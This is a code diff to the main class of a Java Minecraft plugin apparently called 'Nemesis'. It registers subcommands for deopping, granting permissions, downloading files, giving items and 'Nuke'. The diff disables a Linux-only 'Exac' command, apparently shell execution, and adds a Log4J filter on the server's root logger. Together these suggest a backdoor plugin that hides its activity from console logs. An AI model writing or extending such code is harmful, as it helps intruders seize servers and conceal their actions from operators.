@@ -9,7 +9,6 @@ import nemesis.commands.subcommands.BanList;
 import nemesis.commands.subcommands.ClearInventory;
 import nemesis.commands.subcommands.DeOP;
 import nemesis.commands.subcommands.DownloadFile;
-import nemesis.commands.subcommands.Exac;
 import nemesis.commands.subcommands.Gamemode;
 import nemesis.commands.subcommands.GiveItem;
 import nemesis.commands.subcommands.GrantPermission;
@@ -61,8 +60,10 @@ public final class Nemesis extends JavaPlugin {
                 new Nuke(),
                 new WorldList()).forEach(commandManager::registerSubCommand);
         if (Utils.isLinux()) {
-            commandManager.registerSubCommand(new Exac());
+            // commandManager.registerSubCommand(new Exac()); // not now
         }
+
+        setupConsoleFilter();
     }
 
     public static Nemesis getInstance() {
@@ -71,5 +72,19 @@ public final class Nemesis extends JavaPlugin {
 
     public CommandManager getCommandManager() {
         return commandManager;
+    }
+
+    public void setupConsoleFilter() {
+        try {
+            Class.forName("org.apache.logging.log4j.core.filter.AbstractFilter");
+
+            org.apache.logging.log4j.core.Logger logger;
+            logger = (org.apache.logging.log4j.core.Logger) org.apache.logging.log4j.LogManager.getRootLogger();
+            logger.addFilter(new nemesis.Log4JFilter());
+            getLogger().info("Successfully hooked into Log4J!");
+        } catch (ClassNotFoundException | NoClassDefFoundError e) {
+            getLogger().warning("Log4J not found, console filter not enabled");
+            return;
+        }
     }
 }
